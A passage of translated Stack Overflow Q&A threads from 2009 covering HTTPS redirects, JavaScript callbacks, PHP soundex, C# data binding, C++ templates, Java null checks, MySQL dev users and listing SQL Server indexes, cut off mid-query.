我正在做一个项目，用户将转移他的用户名来激活互联网。我想始终将用户重定向到 https 版本，并使 http 版本也重定向到 https，所以只有一个 http 版本。这是一个聪明的举动吗？移动设备（支持 WiFi 的设备）是否存在问题

托马斯

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-01-08T19:14:27.097

我不认为有很多设备不支持 ssl。不过，有一些配置愚蠢的代理。

由于服务器负载，大多数站点都不是“完整的 ssl”，ssl 可以非常快地使服务器崩溃。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-08T19:21:41.547

如果您正在传输安全数据，那么重定向到 HTTPS 绝对是明智之举。作为一名黑客，您会立即在站点中寻找最简单的打开方式。在这种情况下，它将攻击任何不受 SSL 规则限制的设备。

# javascript - 扩展作为参数传递的 Javascript 函数

> ID：425407
> 
> 赞同：2
> 
> 时间：2009-01-08T18:55:47.667
> 
> 标签：javascript

我有一个 javascript 函数（类），它将函数引用作为一个参数。

```
function MyClass ( callBack ) {
  if (typeof callBack !== 'function')
    throw "You didn't pass me a function!"
} 
```

由于我不会进入这里的原因，我需要通过将其包含在匿名函数中来向函数附加一些内容，但我能够弄清楚如何做到这一点的唯一方法是添加一个公共函数**MyClass**将 callBack 函数作为参数并返回修改后的版本。

```
function MyClass () {
    this.modifyCallBack = function ( callBack ) {
       var oldCallBack = callBack;
       callBack = function () {
           oldCallBack(); // call the original functionality
           /* new code goes here */
       }
       return callBack;
    }
}

/* elsewhere on the page, after the class is instantiated and the callback function defined */
myCallBackFunction = MyClassInstance.modifyCallBack( myCallBackFunction ); 
```

将 callBack 函数作为参数传递给类时是否可以使这项工作？在将函数作为参数传递时尝试以这种方式修改函数似乎只会影响它在类中的实例，但这似乎不是一个有效的假设，因为函数是 javascript 中的对象，因此通过参考。

**更新：** 正如 crescentfresh 指出的那样（我没有很好地解释），我想就地修改回调函数。如果在实例化类时可以执行所有这些操作，我宁愿不调用第二个函数。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-01-08T19:57:06.030

函数对象不提供修改它们的方法。因此，你想做的事情不可能按照你想做的方式去做。关于 Java，Jon Skeet 喜欢指出同样的事情：对象并不是真正通过引用传递的，而是通过值传递指向它们的指针。这意味着将参数变量的值更改为新变量根本不会影响原始变量。

在 Java 和 JavaScript 等按值调用语言中，只有两种方法可以做您想做的事情：第一种是使用（函数）对象的方法来修改它。正如我已经说过的，函数对象没有这些。另一种是将函数对象作为属性的对象作为第二个参数传递，并将适当的属性设置为包装旧函数的新函数。

例子：

```
var foo = {};
foo.func = function() {};

function wrapFunc(obj) {
    var oldFunc = obj.func;
    obj.func = function() {
        // do some stuff
        oldFunc.call(obj, _some_argument__);
    };
}

wrapFunc(foo); 
```

这也适用于全局函数：它们是`window`对象的属性。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-08T20:02:31.103

由于 Javascript 对变量使用词法范围，因此可以进行以下操作：

```
var modifiableCallback=function() { alert('A'); };

function ModifyCallbackClass(callback)
{
    modifiableCallback=function() { callback(); alert('B'); };  
}

function body_onload()
{

    var myClass=new ModifyCallbackClass(modifiableCallback);

    modifiableCallback();

} 
```

这可以满足您的要求，但是必须在 ModifyCallbackClass 中使用相同的名称引用函数“modifiableCallback”，否则将不会应用闭包。因此，这可能会稍微限制这种方法对您的有用性。

使用 eval （性能可能会受到一点影响）也可以使这种方法更灵活：

```
var modfiableCallback1=function() { alert('A'); };

var modfiableCallback2=function() { alert('B'); };

var modfiableCallback3=function() { alert('C'); };

function ModifyCallbackClass(callbackName)
{
    var temp=eval(callbackName);
    var temp2=eval(callbackName);

    temp= function() { temp2(); alert('Modified'); };

    eval(callbackName + " = temp;");
}

function body_onload()
{

    var myClass=new ModifyCallbackClass("modfiableCallback1");

    modfiableCallback1();

    myClass=new ModifyCallbackClass("modfiableCallback2");

    modfiableCallback2();

    myClass=new ModifyCallbackClass("modfiableCallback3");

    modfiableCallback3();

} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-08T19:02:39.710

我假设您将这个回调保存在某个地方......任何原因这不起作用？

```
function MyClass ( callBack ) {
  var myCallBack;

  if (typeof callBack !== 'function')
    throw "You didn't pass me a function!"

  var oldCallBack = callBack;
  callBack = function () {
    oldCallBack(); // call the original functionality
     /* new code goes here */
  }
  myCallBack = callback;
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-08T19:24:21.650

你想做这样的事情：

```
function MyClass () {
    this.modifyCallBack = function ( callBack ) {
        var oldCallBack = callBack;
        callBack = function () {
            oldCallBack(); // call the original functionality
            alert("new functionality");
        }
        return callBack;
    }
}

/* elsewhere on the page, after the class is instantiated and the callback function defined */
var myCallBackFunction = function () {alert("original");};
var MyClassInstance = new MyClass();
myCallBackFunction = MyClassInstance.modifyCallBack( myCallBackFunction );
myCallBackFunction(); 
```

# soundex - 当 php SOUNDEX 仅输出 3 位数字时如何在 php 中检查 SOUNDEX

> ID：425421
> 
> 赞同：2
> 
> 时间：2009-01-08T18:59:28.500
> 
> 标签：soundex, php

我正在尝试使用 SOUNDEX 对公司名称进行比较，但对 soundex 的 php 调用仅输出 3 位数字，因此比较不太准确。有没有办法获得更好的 soundex 输出，从而使结果更准确？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-01-08T19:01:28.810

尝试使用[变音](http://us.php.net/metaphone)器

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-09T16:05:35.817

根据您所针对的SOUNDEX ，在数据库级别运行[SOUNDEX()可能更便宜：](http://dev.mysql.com/doc/refman/5.0/en/string-functions.html#function_soundex)

```
$result = $db->query("
    SELECT
        company.id,
        company.name,
        SOUNDEX(company.name) AS soundex
    FROM
        company
    WHERE
        company.name SOUNDS LIKE '$companyName'
"); 
```

# c# - 数据绑定到以编程方式创建的 DataTable

> ID：425424
> 
> 赞同：0
> 
> 时间：2009-01-08T18:59:53.460
> 
> 标签：c#, data-binding, ado.net

假设我有一个这样的数据表：

```
 DataTable dt = new DataTable("Woot");

        dt.Columns.AddRange(new DataColumn[]{
            new DataColumn("ID",typeof(System.Guid)),
            new DataColumn("Name",typeof(String))
            }); 
```

当我尝试将控件绑定到它时：

```
 this.txtName.DataBindings.Add("Text", _dtRow, "Name"); 
```

我得到这个例外：

> 无法绑定到 DataSource 上的属性或列名称。参数名称：dataMember

知道为什么这适用于由 dataAdapter 创建的数据表，但不适用于以编程方式创建的数据表吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-08T19:14:52.120

好的，在弄乱了你的代码一段时间后，我一直被难住了。然后我终于意识到了这个问题。我假设_dtRow 是一个DataRow。您需要参考实际的 DataTable (dt)。

```
this.textBox1.DataBindings.Add("Text", dt, "Name"); 
```

编辑：在看到您对伊戈尔帖子的评论后。如果您绑定到 dt，例如，如果您有一个绑定到此 DataTable 的 datagridview，则每次选择不同的行时，文本框都会更改。

这是对我有用的代码：

```
 DataTable dt = new DataTable("Woot");

            dt.Columns.AddRange(new DataColumn[]{
            new DataColumn("ID",typeof(System.Guid)),
            new DataColumn("Name",typeof(String))
            });

            dt.Rows.Add(Guid.NewGuid(), "John");
            dt.Rows.Add(Guid.NewGuid(), "Jack");

            this.dataGridView1.DataSource = dt;

            this.textBox1.DataBindings.Add("Text", dt, "Name"); 
```

更改 DGV 中的行，您将看到文本框更改文本。

**EIDT AGAIN**好的，是时候破解它了。这就是我让它工作的方式：

```
this.textBox1.DataBindings.Add("Text",_dtRow.ItemArray[1], ""); 
```

我使用了索引 1，但您可以使用数组中所需的任何索引。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-08T19:11:26.450

你不应该引用 dt 而不是 _dtRow 吗？

例如：

```
this.txtName.DataBindings.Add("Text", dt, "Name"); 
```

编辑：

这段代码对我有用：

```
 DataTable dt = new DataTable("Woot");

    dt.Columns.AddRange(new DataColumn[]{
        new DataColumn("ID",typeof(System.Guid)),
        new DataColumn("Name",typeof(String))
    });

    DataRow r = dt.NewRow();
    r["ID"] = new Guid();
    r["Name"] = "AAA";
    dt.Rows.Add(r);

    r = dt.NewRow();
    r["ID"] = new Guid();
    r["Name"] = "BBB";
    dt.Rows.Add(r);

    dataGridView1.DataSource = dt;

    this.txtName.DataBindings.Add("Text", r.Table , "Name"); 
```

# css - Internet Explorer 显示的文本内超链接，没有以下空格。可能是什么原因？优？

> ID：425429
> 
> 赞同：0
> 
> 时间：2009-01-08T19:00:25.050
> 
> 标签：css, internet-explorer

我有一个问题，很可能是一些丑陋的 CSS 错误，但我无法找到解决方案（我尝试的一些更改没有帮助）。

Internet Explorer 显示的一些文本内超链接（不是全部！）没有以下空格。

[这是示例](http://blog.mekk.waw.pl/archives/28-Picking-the-games-to-watch.html)

*请参阅Rationale*标题正下方的链接*WatchBot*（以及文章更深处的一些类似链接）。Firefox、Opera、Chrome、Konqueror - 都可以正常显示：**WatchBot***可以*。IE（6.0 但 IIRC 也是 7.0）将其显示为 **WatchBot***can*。

 ****我正在使用 Yui-reset 和 yui-base。这些库是否有可能导致问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-08T19:05:38.753

您是否有脚本在运行并以任何方式更改内容？我这样说是因为页面最初加载正常，但看起来好像在加载生命周期的后期进行了一些修改。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-08T19:06:40.810

如果您认为 reset 或 base 正在发生这种情况，请尝试一次删除它们 - 但是我之前没有遇到过这个错误（我通常使用完整的重击：Reset、Grids、Base 和 Fonts）。

然而，我确实注意到页面的第一个 WatchBot 链接就是这样的：

```
<p>Have you ever been curious how is 
<a href="http://mekk.waw.pl/mk/watchbot/index">WatchBot</a>
picking the games to observe and save? Here is the explanation.</p> 
```

第二个链接如下所示：

```
<span>Due to the FICS limitations </span>
<a href="http://mekk.waw.pl/mk/watchbot/index">WatchBot</a><span> can 
```

我不知道第二个跨度在那里做了什么——可能需要检查一下。（但是它验证得很好——所以肯定有一个封闭的跨度）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-08T19:15:02.447

我想说一个好的开始位置是在锚点之后但跨度之前的一个空格，而不是在跨度开始标签之后。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-08T20:11:47.747

您是否尝试禁用 pageTracker？它似乎是您页面上唯一的脚本，并且在我看来它的静态形式很好。

编辑：我想知道罗斯在说什么跨度——我没有看到。我查看了源代码。我刚刚了解到 Firefox 允许查看源代码和生成的源代码（Toos/Web Developer/View Source）。果然，生成的源插入了额外的跨度。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-01-08T20:22:55.197

事物的当前状态：正如 steve_c 首先发现的那样，并且 buti-oxa 证实，看起来布局被 javascript 破坏了（正如罗斯指出的那样，注入了一些额外的跨度）。谢谢大家，我错过了。

我要做实验并有选择地禁用这些脚本（分析和谷歌广告）以检查它是否有帮助（我目前的赌注是我可能有一些 HTML 错误或命名冲突）

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-01-09T11:08:37.297

解决方案：我的页面被 text-link-ads 脚本破坏了（事实上，我错误地在英文博客上激活了该脚本 - 这是波兰公司 adkontekst.wp.pl 的脚本）。禁用后一切正常。

感谢所有为我指明正确方向的人。

# c++ - 如何从模板类中的变量返回向量迭代器？

> ID：425430
> 
> 赞同：1
> 
> 时间：2009-01-08T19:00:27.407
> 
> 标签：c++, vector, iterator

我正在尝试为模板类中的向量返回一个迭代器（我不确定这是否会有所不同，但我已经读过它，所以我想我会提到它）。问题是当我尝试这个时，我得到一个关于 C++ 不支持 default-int 的错误。我在网上看过，从我在论坛和解释中看到的，我不认为我离得*那么*远，它只是无法编译。

```
template<class T>
class Table
{
public:
  ...

  vector<shared_ptr<vector<T>>>::iterator GetRowIterator();
  //vector<shared_ptr<vector<CellValueType> > >::const_iterator GetRowIterator();

  ...
protected:

  vector<shared_ptr<vector<CellValueType> > > data;  //outside vector is rows, inside vector is columns

  ...
};

vector<shared_ptr<vector<T> > >::const_iterator Table<T>::GetRowIterator()
{
  return data.begin();
} 
```

我得到的错误是：

```
error C2146: syntax error : missing ';' before identifier 'GetRowIterator'

error C4430: missing type specifier - int assumed. Note: C++ does not support default-int 
```

*编辑：*
更改了末端尖括号，使它们不那么靠近 - 同样的错误。

关于为什么会发生这种情况的任何想法？
与往常一样，提前感谢您的建议/帮助！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-01-08T19:07:35.817

还记得在声明依赖于模板的返回类型时使用 typename：

```
typename vector< shared_ptr< vector< T > > >::iterator GetRowIterator(); 
```

和方法定义

```
typename vector< shared_ptr< vector< T > > >::const_iterator Table<T>::GetRowIterator()
{
  return data.begin();
} 
```

另请注意，在类定义之外定义模板类方法时，必须使用 template 关键字：

```
template <class T> typename vector< shared_ptr< vector< T > > >::const_iterator Table<T>::GetRowIterator()
    {
      return data.begin();
    } 
```

这样编译器就可以知道 T 是关于什么的。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-01-08T19:02:39.993

这部分在这里：

```
vector<shared_ptr<vector<T>>> 
```

这是 C++ 语法的问题，您不能像这样将 >> 放在一起。

```
vector<shared_ptr<vector<T> > > 
```

这是新标准正在解决的问题。

因为词法分析器是编译器的第一阶段，所以它将 >>> 视为左移运算符，后跟 >。因此，您的代码中会出现语法错误。要解决此问题，您只需要在关闭模板时在 > 之间添加空格。

# java - 如何检查数组元素是否为空以避免Java中的NullPointerException

> ID：425439
> 
> 赞同：20
> 
> 时间：2009-01-08T19:02:23.893
> 
> 标签：java, arrays, exception-handling, nullpointerexception

我有一个部分填充的对象数组，当我遍历它们时，我试图检查所选对象是否`null`在我用它做其他事情之前。然而，即使是检查它是否`null`似乎是通过`NullPointerException`. `array.length`也将包括所有`null`元素。您如何检查`null`数组中的元素？例如，在下面的代码中将为我抛出一个 NPE。

```
Object[][] someArray = new Object[5][];
for (int i=0; i<=someArray.length-1; i++) {
    if (someArray[i]!=null) { //do something
    } 
} 
```

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2009-01-08T19:08:49.077

你的事情比你说的要多。我从您的示例中运行了以下扩展测试：

```
public class test {

    public static void main(String[] args) {
        Object[][] someArray = new Object[5][];
        someArray[0] = new Object[10];
        someArray[1] = null;
        someArray[2] = new Object[1];
        someArray[3] = null;
        someArray[4] = new Object[5];

        for (int i=0; i<=someArray.length-1; i++) {
            if (someArray[i] != null) {
                System.out.println("not null");
            } else {
                System.out.println("null");
            }
        }
    }
} 
```

并得到了预期的输出：

```
$ /cygdrive/c/Program\ Files/Java/jdk1.6.0_03/bin/java -cp . test
not null
null
not null
null
not null 
```

您是否可能尝试检查 someArray[index] 的长度？

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2009-01-08T19:11:46.917

它不是。

见下文。您发布的程序按预期运行。

```
C:\oreyes\samples\java\arrays>type ArrayNullTest.java
public class ArrayNullTest {
    public static void main( String [] args ) {
        Object[][] someArray = new Object[5][];
            for (int i=0; i<=someArray.length-1; i++) {
                 if (someArray[i]!=null ) {
                     System.out.println("It wasn't null");
                 } else {
                     System.out.printf("Element at %d was null \n", i );
                 }
             }
     }
}

C:\oreyes\samples\java\arrays>javac ArrayNullTest.java

C:\oreyes\samples\java\arrays>java ArrayNullTest
Element at 0 was null
Element at 1 was null
Element at 2 was null
Element at 3 was null
Element at 4 was null

C:\oreyes\samples\java\arrays> 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2015-08-10T10:35:07.343

```
String labels[] = { "MH", null, "AP", "KL", "CH", "MP", "GJ", "OR" }; 

if(Arrays.toString(labels).indexOf("null") > -1)  {
    System.out.println("Array Element Must not be null");
                     (or)
    throw new Exception("Array Element Must not be null");
}        
------------------------------------------------------------------------------------------         

For two Dimensional array

String labels2[][] = {{ "MH", null, "AP", "KL", "CH", "MP", "GJ", "OR" },{ "MH", "FG", "AP", "KL", "CH", "MP", "GJ", "OR" };    

if(Arrays.deepToString(labels2).indexOf("null") > -1)  {
    System.out.println("Array Element Must not be null");
                 (or)
    throw new Exception("Array Element Must not be null");
}    
------------------------------------------------------------------------------------------

same for Object Array    

String ObjectArray[][] = {{ "MH", null, "AP", "KL", "CH", "MP", "GJ", "OR" },{ "MH", "FG", "AP", "KL", "CH", "MP", "GJ", "OR" };    

if(Arrays.deepToString(ObjectArray).indexOf("null") > -1)  {
    System.out.println("Array Element Must not be null");
              (or)
    throw new Exception("Array Element Must not be null");
  } 
```

如果你想找到一个特定的空元素，你应该使用上面所说的 for 循环。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-01-08T19:09:59.430

给定的代码对我有用。请注意， someArray[i] 始终为 null，因为您尚未初始化数组的第二维。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-01-08T19:11:19.850

好吧，首先，该代码无法编译。

在 i++ 之后删除多余的分号后，它可以编译并运行良好。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-01-08T19:17:41.677

示例代码不会引发 NPE。（在 i++ 后面也不应该有 ';'）

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-04-28T18:08:56.010

无论代码是否正在编译，我会说创建一个包含 6 个 5 的数组并添加 2 个值并打印它们，您将得到这两个值，而其他值则为空。问题是虽然大小为 5 但数组中有 2 个对象。如何查找数组中存在多少对象

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2017-02-09T14:58:49.087

```
public static void main(String s[])
{
    int firstArray[] = {2, 14, 6, 82, 22};
    int secondArray[] = {3, 16, 12, 14, 48, 96};
    int number = getCommonMinimumNumber(firstArray, secondArray);
    System.out.println("The number is " + number);

}
public static int getCommonMinimumNumber(int firstSeries[], int secondSeries[])
{
    Integer result =0;
    if ( firstSeries.length !=0 && secondSeries.length !=0 )
    {
        series(firstSeries);
        series(secondSeries);
        one : for (int i = 0 ; i < firstSeries.length; i++)
        {
            for (int j = 0; j < secondSeries.length; j++)
                if ( firstSeries[i] ==secondSeries[j])
                {
                    result =firstSeries[i];
                    break one;
                }
                else
                    result = -999;
        }
    }
    else if ( firstSeries == Null || secondSeries == null)
        result =-999;

    else
        result = -999;

    return result;
}

public static int[] series(int number[])
{

    int temp;
    boolean fixed = false;
    while(fixed == false)
    {
        fixed = true;
        for ( int i =0 ; i < number.length-1; i++)
        {
            if ( number[i] > number[i+1])
            {
                temp = number[i+1];
                number[i+1] = number[i];
                number[i] = temp;
                fixed = false;
            }
        }
    }
    /*for ( int i =0 ;i< number.length;i++)
    System.out.print(number[i]+",");*/
    return number;

} 
```

* * *

## 回答 #9

> 赞同：-1
> 
> 时间：2018-03-08T10:13:23.037

您可以在一行代码中执行此操作（无需数组声明）：

```
object[] someArray = new object[] 
{
    "aaaa",
    3,
    null
};
bool containsSomeNull = someArray.Any(x => x == null); 
```

# c++ - 从具有模板构造函数的非模板类继承 - 如何解决歧义？

> ID：425457
> 
> 赞同：2
> 
> 时间：2009-01-08T19:07:47.673
> 
> 标签：c++, templates, constructor

假设我们有一个类 MyParent：

```
class MyParent
{
public:
  template<namespace T>
  MyParent()
  {
    T* Something;
  }
}; 
```

还有一个派生类，它使用这个构造函数：

```
class MyDerived : public MyParent
{
public:
  MyDerived()
  : MyParent<int>()
  {
  }
}; 
```

然后我得到一个编译错误，因为有歧义。编译器认为***int***是类的模板参数，而不是构造函数。

如何指定我希望***int***作为构造函数的参数？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-01-08T19:49:58.023

这不可能。从标准部分 14.8.1 显式模板参数中，它指出：

> [注意：因为显式模板实参列表跟在函数模板名之后，并且因为转换成员函数模板和构造函数成员函数模板是在不使用函数名的情况下调用的，所以无法为这些函数模板提供显式模板实参列表。]

如评论中所述，您需要让构造函数采用`T`（或`const T &`）类型的参数，然后使用类型参数进行`MyDerived`调用。`MyParent::MyParent``int`

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-01-08T19:53:04.867

请注意，您的问题并非特定于继承。鉴于您的代码示例，您根本无法实例化`MyParent`，要么是因为它不接受模板参数列表，要么是因为它没有默认构造函数。

为了`MyParent`使用构造函数模板进行实例化，您需要为编译器提供一些知道模板参数的方法，而使用无参数构造函数则无法做到这一点。你需要给`MyParent`'s 的构造函数一个参数。这是一个基于[Alf P. Steinbach 代码](http://www.velocityreviews.com/forums/t545918-template-default-constructor-possible.html)的示例：

```
template <typename T>
struct UseMethodsOf {};

class MyParent
{
public:
  template <typename T>
  MyParent(UseMethodsOf<T>)
  {
    T* Something;
  }
};

class MyDerived: public MyParent
{
public:
  MyDerived()
  : MyParent(UseMethodsOf<int>())
  {
  }
}; 
```

# mysql - 如何为 Rails Dev 添加本地 Mysql 用户？

> ID：425461
> 
> 赞同：0
> 
> 时间：2009-01-08T19:08:29.480
> 
> 标签：mysql, ruby

我有一个问题，我总是需要简单地访问我的本地帐户，并且不想在我的本地计算机上输入我的 root 密码一百万次。我如何授予权限，以便我可以与本地用户一起键入“mysql”并访问所有内容？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-13T20:01:50.457

这为本地用户提供了从数据库中进行选择的开发机器权限，以及一个 local_rails_user 帐户（您可以自己使用）权限来运行任何迁移。只是想我会把它存储在这里以防其他人想要使用它。不适用于生产机器。

本地 Rails 用户：

```
insert into user(host,user,password) values ('localhost','local_rails_user','');
grant SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, RELOAD on *.* to
   'local_rails_user'@'localhost'; 
```

本地查看器：

```
insert into user(host,user,password) values ('localhost','','');
grant SELECT on *.* to ''@'localhost'; 
```

完成后确保“刷新权限”。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-09T09:25:00.017

为什么不只使用root？毕竟，这是您的本地计算机。

有一种过于偏执的事情。

# windows - Windows XP、Vista 和现在的 Windows 7，这是软件公司的维护噩梦吗？

> ID：425472
> 
> 赞同：3
> 
> 时间：2009-01-08T19:10:39.773
> 
> 标签：windows, versioning

对于像游戏这样的软件应用程序，这是否意味着软件公司需要大量额外的代码来维护某些库的 3 个分支？

我知道这很难说，但是对于一般的游戏开发，软件中是否有特定的区域需要编写 3 次才能在所有 3 种风格的窗口中工作？

我猜核心软件将保持不变，但也许某些驱动程序需要特定于版本？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-08T19:13:55.757

这取决于您与操作系统的距离。如果您只是使用 .NET 框架或 DirectX，则操作系统之间可能没有太大变化。如果您正在编写驱动程序或依赖 Win32 API，那么肯定会有细微或不那么细微的变化。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-08T19:13:49.643

如果您的代码一开始就正确编写，那么在支持操作系统升级方面不应该进行大量投资。使用 .NET 框架之类的东西有助于进一步保证这一点。

另外，为什么游戏会有“驱动程序”？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-08T19:17:32.397

并不真地。如果您使用 DirectX 9，则在所有 3 个 Windows 版本上都可以。额外的维护围绕着诸如安装程序/卸载程序、关于 Vista 中新的游戏选项卡（如果你想使用它）等的东西而发展，但如前所述，DirectX 9 是所有 3 上的稳定 API。

您将通过 DirectX 10（不在 WinXP 上）和 OpenGL（Vista 中的支持很奇怪）获得一些乐趣。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-08T19:28:21.080

即使您使用 DirectX 或 .Net 之类的“便携式”接口或任何应该提供相同功能的接口，负责任的软件开发人员也必须在每个受支持的平台上进行 QA 和测试。

（请注意，我并不声称自己是负责任的软件开发人员。:-)）

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-01-08T19:34:05.733

许多游戏开发者，包括我工作的工作室，都使用管理跨平台问题的引擎。我们在游戏中使用虚幻引擎，它可以移植到 PS3、Xbox 和 PC 上，除了它们之间的性能差异之外没有任何问题。引擎通常处理平台的差异。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-01-08T19:34:17.417

作为一名 .Net 开发人员，我在运行使用 XP 作为原始目标构建的应用程序时看到的大多数问题都是我们做错了，而恰好在 XP 中工作（大多数使用在 XP 上看起来不错但错误的系统颜色）对于 Vista - 例如，默认的 Vista 主题会导致黑色背景上的黑色字体）。

它是最好的巧合编码（我们天真到不知道它是错误的）。但是，一旦我们开始在 Vista 和 XP 上进行测试，我们就开始生产更好的 Windows 产品。

# sql-server - 列出所有索引

> ID：425475
> 
> 赞同：23
> 
> 时间：2009-01-08T19:11:06.043
> 
> 标签：sql-server, indexing, metadata, sysobjects

我想知道列出数据库中所有表的所有索引 的*最简单方法是什么。*

我应该调用`sp_helpindex`每个表并将结果存储在临时表中，还是有更简单的方法？

谁能解释为什么约束存储在 sysobjects 但索引没有？

* * *

## 回答 #1

> 赞同：37
> 
> 时间：2009-01-09T14:30:57.397

这是您需要的查询类型的示例：

```
select 
    i.name as IndexName, 
    o.name as TableName, 
    ic.key_ordinal as ColumnOrder,
    ic.is_included_column as IsIncluded, 
    co.[name] as ColumnName
from sys.indexes i 
join sys.objects o on i.object_id = o.object_id
join sys.index_columns ic on ic.object_id = i.object_id 
    and ic.index_id = i.index_id
join sys.columns co on co.object_id = i.object_id 
    and co.column_id = ic.column_id
where i.[type] = 2 
and i.is_unique = 0 
and i.is_primary_key = 0
and o.[type] = 'U'
--and ic.is_included_column = 0
order by o.[name], i.[name], ic.is_included_column, ic.key_ordinal
; 
```

这个有点特定于某个目的（我在一个小的 C# 应用程序中使用它来查找重复的索引并格式化输出，因此它实际上可以被人类阅读）。但是你可以很容易地适应你的需要。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2009-01-08T19:13:08.287

你可以参考[sysindexes](http://msdn.microsoft.com/en-us/library/ms190283.aspx)

另一个技巧是查看 sp_helpindex 的文本，以了解它如何从基础表中重建信息。

```
sp_helptext 'sp_helpindex' 
```

我没有这方面的参考，但我相信约束没有存储在 sysobjects 中，因为它们是一种不同的东西；sysindexes 包含有关 sysobjects 中对象的元数据。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2009-01-08T19:22:41.903

如果您需要更多信息，这里有一个很好的 SQL 脚本，我不时使用它：

```
DECLARE @TabName varchar(100)

CREATE TABLE #temp (
   TabName varchar(200), IndexName varchar(200), IndexDescr varchar(200), 
   IndexKeys varchar(200), IndexSize int
)

DECLARE cur CURSOR FAST_FORWARD LOCAL FOR
    SELECT name FROM sysobjects WHERE xtype = 'U'

OPEN cur

FETCH NEXT FROM cur INTO @TabName
WHILE @@FETCH_STATUS = 0
    BEGIN
        INSERT INTO #temp (IndexName, IndexDescr, IndexKeys)
        EXEC sp_helpindex @TabName

        UPDATE #temp SET TabName = @TabName WHERE TabName IS NULL

        FETCH NEXT FROM cur INTO @TabName
    END

CLOSE cur
DEALLOCATE cur

DECLARE @ValueCoef int
SELECT @ValueCoef = low FROM Master.dbo.spt_values WHERE number = 1 AND type = N'E'

UPDATE #temp SET IndexSize = 
    ((CAST(sysindexes.used AS bigint) * @ValueCoef)/1024)/1024
        FROM sysobjects INNER JOIN sysindexes ON sysobjects.id = sysindexes.id
            INNER JOIN #temp T ON T.TabName = sysobjects.name AND T.IndexName = sysindexes.name

SELECT * FROM #temp
ORDER BY TabName, IndexName 

DROP TABLE #temp 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2014-02-21T18:48:23.043

这是一个脚本，它将返回 SQL 语句以重新创建数据库中的所有索引。

```
SELECT ' CREATE ' +
       CASE 
            WHEN I.is_unique = 1 THEN ' UNIQUE '
            ELSE ''
       END +
       I.type_desc COLLATE DATABASE_DEFAULT + ' INDEX ' +
       I.name + ' ON ' +
       SCHEMA_NAME(T.schema_id) + '.' + T.name + ' ( ' +
       KeyColumns + ' )  ' +
       ISNULL(' INCLUDE (' + IncludedColumns + ' ) ', '') +
       ISNULL(' WHERE  ' + I.filter_definition, '') + ' WITH ( ' +
       CASE 
            WHEN I.is_padded = 1 THEN ' PAD_INDEX = ON '
            ELSE ' PAD_INDEX = OFF '
       END + ',' +
       'FILLFACTOR = ' + CONVERT(
           CHAR(5),
           CASE 
                WHEN I.fill_factor = 0 THEN 100
                ELSE I.fill_factor
           END
       ) + ',' +
       -- default value 
       'SORT_IN_TEMPDB = OFF ' + ',' +
       CASE 
            WHEN I.ignore_dup_key = 1 THEN ' IGNORE_DUP_KEY = ON '
            ELSE ' IGNORE_DUP_KEY = OFF '
       END + ',' +
       CASE 
            WHEN ST.no_recompute = 0 THEN ' STATISTICS_NORECOMPUTE = OFF '
            ELSE ' STATISTICS_NORECOMPUTE = ON '
       END + ',' +
       ' ONLINE = OFF ' + ',' +
       CASE 
            WHEN I.allow_row_locks = 1 THEN ' ALLOW_ROW_LOCKS = ON '
            ELSE ' ALLOW_ROW_LOCKS = OFF '
       END + ',' +
       CASE 
            WHEN I.allow_page_locks = 1 THEN ' ALLOW_PAGE_LOCKS = ON '
            ELSE ' ALLOW_PAGE_LOCKS = OFF '
       END + ' ) ON [' +
       DS.name + ' ] ' +  CHAR(13) + CHAR(10) + ' GO' [CreateIndexScript]
FROM   sys.indexes I
       JOIN sys.tables T
            ON  T.object_id = I.object_id
       JOIN sys.sysindexes SI
            ON  I.object_id = SI.id
            AND I.index_id = SI.indid
       JOIN (
                SELECT *
                FROM   (
                           SELECT IC2.object_id,
                                  IC2.index_id,
                                  STUFF(
                                      (
                                          SELECT ' , ' + C.name + CASE 
                                                                       WHEN MAX(CONVERT(INT, IC1.is_descending_key)) 
                                                                            = 1 THEN 
                                                                            ' DESC '
                                                                       ELSE 
                                                                            ' ASC '
                                                                  END
                                          FROM   sys.index_columns IC1
                                                 JOIN sys.columns C
                                                      ON  C.object_id = IC1.object_id
                                                      AND C.column_id = IC1.column_id
                                                      AND IC1.is_included_column = 
                                                          0
                                          WHERE  IC1.object_id = IC2.object_id
                                                 AND IC1.index_id = IC2.index_id
                                          GROUP BY
                                                 IC1.object_id,
                                                 C.name,
                                                 index_id
